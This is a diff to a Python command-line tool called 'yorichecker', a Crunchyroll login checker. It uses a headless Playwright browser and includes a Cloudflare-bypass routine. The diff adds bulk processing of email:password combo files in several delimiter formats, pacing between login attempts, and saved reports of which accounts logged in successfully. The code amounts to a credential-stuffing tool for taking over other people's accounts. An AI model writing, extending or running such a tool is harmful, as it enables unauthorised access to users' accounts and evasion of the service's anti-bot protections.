@@ -1,6 +1,9 @@
 import asyncio
 import argparse
 import sys
+import os
+import time
+from pathlib import Path
 from playwright.async_api import async_playwright
 import logging
 
@@ -8,6 +11,17 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 HEADLESS = True
+
+# Directory setup
+HOME_DIR = Path.home()
+YORICHECKER_DIR = HOME_DIR / "YORICHECKER"
+RESULTS_DIR = YORICHECKER_DIR / "RESULTS"
+
+def ensure_directories():
+    """Ensure YORICHECKER and RESULTS directories exist."""
+    YORICHECKER_DIR.mkdir(exist_ok=True)
+    RESULTS_DIR.mkdir(exist_ok=True)
+    return YORICHECKER_DIR, RESULTS_DIR
 
 async def bypass_cloudflare(page, max_wait=120):
     start = asyncio.get_event_loop().time()
@@ -219,75 +233,229 @@ async def login_crunchyroll(email: str, password: str) -> dict:
 
     return result
 
-def process_credentials(email: str, password: str):
-    """Run login coroutine and return formatted result."""
+def process_credentials_raw(email: str, password: str) -> dict:
+    """Run login coroutine and return raw result dict."""
     try:
         result = asyncio.run(login_crunchyroll(email, password))
-        status = "SUCCESS" if result["success"] else "FAILED"
-        # Mask email for privacy in output
-        masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else email
-        return f"{masked_email}: {status} - {result['message']}"
+        return result
     except Exception as e:
-        masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else email
-        return f"{masked_email}: ERROR - {str(e)}"
+        return {"success": False, "message": f"Error: {str(e)}"}
+
+def format_result(email: str, result: dict) -> str:
+    """Format result for display."""
+    status = "SUCCESS" if result["success"] else "FAILED"
+    # Mask email for privacy in output
+    masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else email
+    return f"{masked_email}: {status} - {result['message']}"
+
+def detect_and_parse_line(line: str):
+    """Detect delimiter and parse email:password from line."""
+    line = line.strip()
+    if not line:
+        return None, None
+
+    # Try different delimiters in order of preference
+    delimiters = [':', ' ', ';']
+    for delim in delimiters:
+        if delim in line:
+            parts = line.split(delim, 1)
+            if len(parts) == 2:
+                email = parts[0].strip()
+                password = parts[1].strip()
+                if email and password:  # Both non-empty
+                    return email, password
+    return None, None
+
+def process_file(filename: str) -> list:
+    """Process a file containing email:password pairs.
+
+    Returns list of tuples: (email, password, result_dict)
+    """
+    ensure_directories()
+    filepath = YORICHECKER_DIR / filename
+
+    if not filepath.exists():
+        raise FileNotFoundError(f"File '{filename}' not found in {YORICHECKER_DIR}")
+
+    results = []
+    with open(filepath, 'r', encoding='utf-8') as f:
+        for line_num, line in enumerate(f, 1):
+            line = line.rstrip('\n\r')
+            if not line.strip():
+                continue
+
+            email, password = detect_and_parse_line(line)
+            if email is None or password is None:
+                logger.warning(f"Skipping invalid line {line_num}: {line}")
+                continue
+
+            logger.info(f"Processing line {line_num}: {email[:3]}***@{email.split('@')[1] if '@' in email else email}")
+            result = process_credentials_raw(email, password)
+            results.append((email, password, result))
+
+            # Medium speed delay: 2 seconds between accounts
+            time.sleep(2)
+
+    return results
+
+def save_results(filename: str, results: list):
+    """Save processing results to a file in RESULTS directory."""
+    ensure_directories()
+    timestamp = time.strftime("%Y%m%d_%H%M%S")
+    safe_filename = "".join(c for c in filename if c.isalnum() or c in ('.', '_', '-')).rstrip('.')
+    result_filename = f"{safe_filename}_results_{timestamp}.txt"
+    result_path = RESULTS_DIR / result_filename
+
+    with open(result_path, 'w', encoding='utf-8') as f:
+        f.write(f"Crunchyroll Checker Results\n")
+        f.write(f"Source file: {filename}\n")
+        f.write(f"Processed at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write(f"Total accounts: {len(results)}\n")
+        f.write("="*50 + "\n\n")
+
+        for i, (email, password, result) in enumerate(results, 1):
+            status = "SUCCESS" if result["success"] else "FAILED"
+            masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else email
+            f.write(f"{i}. {masked_email}: {status} - {result['message']}\n")
+            if not result["success"]:
+                f.write(f"   Details: {result['message']}\n")
+
+    return result_path
 
 def main():
-    parser = argparse.ArgumentParser(description='Crunchyroll Login Checker (CLI Version)')
-    group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('--email', help='Crunchyroll email address (single mode)')
-    group.add_argument('--file', help='Path to txt file containing email password pairs (one per line)')
-    parser.add_argument('--password', help='Crunchyroll password (required for single mode)')
-    parser.add_argument('--headless', action='store_true', help='Run browser in headless mode (default: True)')
-    parser.add_argument('--no-headless', dest='headless', action='store_false', help='Run browser with UI')
-    parser.set_defaults(headless=True)
+    parser = argparse.ArgumentParser(
+        description='Crunchyroll Login Checker - Advanced CLI Tool',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='''
+Examples:
+  yorichecker init                          # Create YORICHECKER directory structure
+  yorichecker check email@example.com pass  # Check single account
+  yorichecker check accounts.txt            # Check accounts in YORICHECKER/accounts.txt
+  yorichecker help                          # Show this help message
+  yorichecker version                       # Show version information
+
+After first run, the tool creates ~/YORICHECKER/ directory.
+Place your credential files in ~/YORICHECKER/ and process them with:
+  yorichecker check filename.txt
+
+Files should contain email:password pairs (supports :, space, or ; as delimiters).
+Results are saved to ~/YORICHECKER/RESULTS/ as timestamped text files.
+        '''
+    )
+
+    # Add version argument that works with subparsers
+    parser.add_argument('--version', action='store_true', help='Show version information')
+
+    subparsers = parser.add_subparsers(dest='command', help='Available commands')
+
+    # Init command
+    init_parser = subparsers.add_parser('init', help='Create YORICHECKER directory structure')
+
+    # Check command
+    check_parser = subparsers.add_parser('check', help='Check Crunchyroll credentials')
+    check_parser.add_argument('target', help='Email address or filename (must be in YORICHECKER/ folder)')
+    check_parser.add_argument('--password', help='Password for email mode (required when target is an email)')
+    check_parser.add_argument('--no-headless', action='store_false', dest='headless',
+                              help='Run browser with UI (default: headless)')
+
+    # Help command (argparse adds this automatically, but we can customize)
+    help_parser = subparsers.add_parser('help', help='Show help message')
 
     args = parser.parse_args()
 
     global HEADLESS
-    HEADLESS = args.headless
+    if hasattr(args, 'headless'):
+        HEADLESS = args.headless
 
-    if args.email:
-        if not args.password:
-            parser.error("--password is required when using --email")
-        print(f"Processing single account: {args.email[:3]}***@{args.email.split('@')[1]}")
-        print("Please wait 30-40 seconds...")
-        result = process_credentials(args.email, args.password)
-        print(result)
-        sys.exit(0 if "SUCCESS" in result else 1)
+    # Handle version flag
+    if args.version:
+        print("yorichecker 0.1.0")
+        return
 
-    elif args.file:
-        try:
-            with open(args.file, 'r', encoding='utf-8') as f:
-                lines = [line.strip() for line in f if line.strip()]
-        except FileNotFoundError:
-            print(f"Error: File '{args.file}' not found.")
-            sys.exit(1)
-        except Exception as e:
-            print(f"Error reading file: {e}")
-            sys.exit(1)
+    # Handle commands
+    if args.command == 'init':
+        ensure_directories()
+        print(f"[+] Created YORICHECKER directory structure:")
+        print(f"    [DIR] {YORICHECKER_DIR}")
+        print(f"    [DIR] {RESULTS_DIR}")
+        print(f"\nPlace your credential files in {YORICHECKER_DIR}")
+        print(f"Process them with: yorichecker check <filename>")
+        return
 
-        if not lines:
-            print("Error: File is empty.")
-            sys.exit(1)
+    elif args.command == 'help':
+        parser.print_help()
+        return
 
-        print(f"Processing {len(lines)} accounts from {args.file}...")
-        success_count = 0
-        for i, line in enumerate(lines, 1):
-            # Split first space: email is first token, password is rest
-            parts = line.split(' ', 1)
-            if len(parts) < 2:
-                print(f"[{i}/{len(lines)}] INVALID FORMAT: '{line}' (expected: email password)")
-                continue
-            email, password = parts
-            print(f"[{i}/{len(lines)}] Processing: {email[:3]}***@{email.split('@')[1] if '@' in email else email} ...", end=' ', flush=True)
-            result = process_credentials(email, password)
-            # result already formatted; print it
-            print(result)
-            if "SUCCESS" in result:
-                success_count += 1
+    elif args.command == 'check':
+        ensure_directories()
 
-        print(f"\nSummary: {success_count}/{len(lines)} successful logins")
-        sys.exit(0 if success_count > 0 else 1)
+        # Determine if target is email or filename
+        if '@' in args.target and not args.target.endswith('.txt'):
+            # Email mode
+            if not args.password:
+                parser.error("--password is required when checking an email address")
+
+            print(f"[+] Checking single account: {args.target[:3]}***@{args.target.split('@')[1]}")
+            print("Please wait 30-40 seconds...")
+
+            result = process_credentials_raw(args.target, args.password)
+            formatted = format_result(args.target, result)
+            print(f"\n{formatted}")
+
+            # Also save single result to RESULTS
+            timestamp = time.strftime("%Y%m%d_%H%M%S")
+            safe_email = "".join(c for c in args.target if c.isalnum() or c in ('@', '.', '_', '-')).replace('@', '_at_')
+            result_filename = RESULTS_DIR / f"single_{safe_email}_{timestamp}.txt"
+            with open(result_filename, 'w') as f:
+                f.write(f"Single Account Check\n")
+                f.write(f"Email: {args.target}\n")
+                f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Result: {formatted}\n")
+            print(f"[+] Result saved to: {result_filename}")
+
+            sys.exit(0 if result["success"] else 1)
+
+        else:
+            # File mode
+            filename = args.target
+            # Ensure it's just a filename, not a path
+            if '/' in filename or '\\' in filename:
+                parser.error("Please provide only the filename (must be located in YORICHECKER/ folder)")
+
+            print(f"[+] Processing file: {filename}")
+            print(f"[+] Looking in: {YORICHECKER_DIR}")
+
+            try:
+                results = process_file(filename)
+
+                if not results:
+                    print("[-] No valid accounts found in file.")
+                    sys.exit(1)
+
+                success_count = sum(1 for _, _, r in results if r["success"])
+                print(f"\n[+] Processing complete: {success_count}/{len(results)} successful logins")
+
+                # Save results
+                result_path = save_results(filename, results)
+                print(f"[+] Detailed results saved to: {result_path}")
+                print(f"[+] Results directory: {RESULTS_DIR}")
+
+                sys.exit(0 if success_count > 0 else 1)
+
+            except FileNotFoundError as e:
+                print(f"[-] {e}")
+                print(f"[i] Place your file in {YORICHECKER_DIR} or run 'yorichecker init' to create directories")
+                sys.exit(1)
+            except Exception as e:
+                print(f"[-] Error processing file: {e}")
+                sys.exit(1)
+
+    else:
+        # No command given - show help or enter interactive mode?
+        # For now, show help
+        parser.print_help()
+        print("\n[i] Tip: Run 'yorichecker init' first to set up directories")
+
 
 if __name__ == "__main__":
     main()
